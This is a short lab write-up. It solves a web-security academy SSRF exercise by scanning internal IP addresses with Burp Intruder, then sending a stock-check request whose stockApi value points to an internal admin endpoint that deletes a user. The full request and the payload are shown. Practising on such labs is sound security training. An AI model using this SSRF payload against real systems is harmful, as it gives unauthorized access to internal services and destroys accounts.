# SSRF attacks against other back-end systems

_This lab has a stock check feature which fetches data from an internal system. To solve the lab, change the stock check URL to access the admin interface at http://localhost/admin and delete the user carlos. The developer has deployed two weak anti-SSRF defenses that you will need to bypass._

`SOLUTION`

I put on the `BurpSuite Intruder` at work for this with by applying payloads from 1 to 255 on the 4th position of the IP address to look for a `200 OK` request, that is our entry point to the admin portal!  

Found `admin` at `192.168.0.135:8080`, then proceeded with the same ol' tricks.

```
POST /product/stock HTTP/2
Host: 0a0700be045a2ae28096b71600b20037.web-security-academy.net
Cookie: session=Ri4ZUwM5NtTKcvRYwcTnP6N0dHacu4Yx
Content-Length: 63
Sec-Ch-Ua-Platform: "macOS"
Accept-Language: en-GB,en;q=0.9
Sec-Ch-Ua: "Not;A=Brand";v="8", "Chromium";v="150"
Content-Type: application/x-www-form-urlencoded
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36
Accept: */*
Origin: https://0a0700be045a2ae28096b71600b20037.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a0700be045a2ae28096b71600b20037.web-security-academy.net/product?productId=2
Accept-Encoding: gzip, deflate, br
Priority: u=1, i

stockApi=http://192.168.0.135:8080/admin/delete?username=carlos
```

> LAB SOLVED!!!
